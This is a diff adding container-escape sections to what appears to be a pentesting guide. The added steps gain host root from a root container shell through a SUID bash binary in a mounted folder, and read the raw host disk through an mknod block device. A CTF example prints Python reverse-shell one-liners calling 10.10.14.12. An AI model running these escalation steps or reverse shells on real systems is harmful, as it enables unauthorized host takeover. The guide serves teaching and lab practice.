@@ -384,6 +384,61 @@ In several occasions you will find that the **container has some volume mounted 
 docker run --rm -it -v /:/host ubuntu bash
 ```
 
+### Privilege Escalation with 2 shells and host mount
+
+If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder.\
+You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.
+
+```bash
+cp /bin/bash . #From non priv inside mounted folder
+# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
+chown root:root bash #From container as root inside mounted folder
+chmod 4777 bash #From container as root inside mounted folder
+bash -p #From non priv inside mounted folder
+```
+
+### Privilege Escalation with 2 shells
+
+If you have access as **root inside a container** and you have **escaped as a non privileged user to the host**, you can abuse both shells to **privesc inside the host** if you have the capability MKNOD inside the container (it's by default) as [**explained in this post**](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
+With such capability the root user within the container is allowed to **create block device files**. Device files are special files that are used to **access underlying hardware & kernel modules**. For example, the /dev/sda block device file gives access to **read the raw data on the systems disk**.
+
+Docker ensures that block devices **cannot be abused from within the container** by setting a cgroup policy on the container that blocks read and write of block devices.\
+However, if a block device is **created within the container it can be accessed** through the /proc/PID/root/ folder by someone **outside the container**, the limitation being that the **process must be owned by the same user** outside and inside the container.
+
+**Exploitation** example from this [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+
+```bash
+# On the container as root
+cd /
+# Crate device
+mknod sda b 8 0
+# Give access to it
+chmod 777 sda
+
+# Create the nonepriv user of the host inside the container
+## In this case it's called augustus
+echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
+# Get a shell as augustus
+su augustus
+su: Authentication failure
+(Ignored)
+augustus@3a453ab39d3d:/backend$ /bin/sh
+/bin/sh
+$ 
+```
+
+```bash
+augustus@GoodGames:~$ ps -auxf | grep /bin/sh
+root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
+augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh
+# The process ID is 1659 in this case
+# Grep for the sda for HTB{ through the process:
+augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda 
+HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
+```
+
 ### hostPID
 
 If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:
@@ -454,6 +509,14 @@ If you only have `hostIPC=true`, you most likely can't do much. If any process o
 
 * **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
 * **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a`
+
+### User namespace abuse via symlink
+
+The second technique explained in the post [https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.f-secure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indicates how you can abuse bind mounts with user namespaces, to affect files inside the host (in that specific case, delete files).
+
+
+
+
 
 {% hint style="danger" %}
 <img src="../../../../.gitbook/assets/security-hubs-logo_v1.2 (1).png" alt="" data-size="original">
